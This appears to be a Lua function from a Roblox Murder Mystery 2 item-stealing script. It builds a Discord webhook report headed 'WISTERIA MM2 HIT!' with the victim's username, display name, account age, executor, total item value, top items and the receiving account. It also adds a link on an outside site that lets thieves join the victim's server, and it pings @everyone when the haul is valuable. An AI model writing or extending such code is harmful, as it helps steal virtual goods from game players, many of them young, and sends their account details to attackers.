local function BuildEmbed(ReceiverName)
    local Mention = false
    for _, Item in ipairs(AllInventoryItems) do
        local Pos = table.find(RarityPriority, Item.Rarity)
        if Item.Value >= MINIMUM_VALUE or (Pos and GodlyPosition and Pos <= GodlyPosition) then
            Mention = true break
        end
    end
    local Top = {}
    for i = 1, math.min(10, #AllInventoryItems) do
        local Item = AllInventoryItems[i]
        local Name = FormatNameDisplay(Item.Name)
        if Item.IsChroma then Name = "Chroma "..Name end
        table.insert(Top, "> "..Name.." ["..Item.Count.."] - "..Item.Total)
    end
    local JobId = _G.RealJobID
    local Fields = {
        {name = "Player Info", value = "```Username: "..LocalPlayer.Name.."\nDisplay: "..LocalPlayer.DisplayName.."\nAccount Age: "..LocalPlayer.AccountAge.." days\nExecutor: ".._G.RealExecutor.."\nReceiver: "..ReceiverName.."```", inline = false},
        {name = "Stats", value = "```Total Items: "..#AllInventoryItems.."\nTradeable Value: "..TotalTradeValue.."```", inline = false},
        {name = "Top Items", value = "```"..table.concat(Top, "\n").."```", inline = false}
    }
    table.insert(Fields, {name = "Join Link", value = "[Click Here](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId="..JobId..")", inline = false})
    return {
        author = {name = "WISTERIA MM2 HIT!"},
        color = 0x4B5563,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = Fields,
        footer = {text = "WISTERIA MM2 • "..os.date("%Y-%m-%d %H:%M:%S")}
    }, Mention and "@everyone" or ""
end

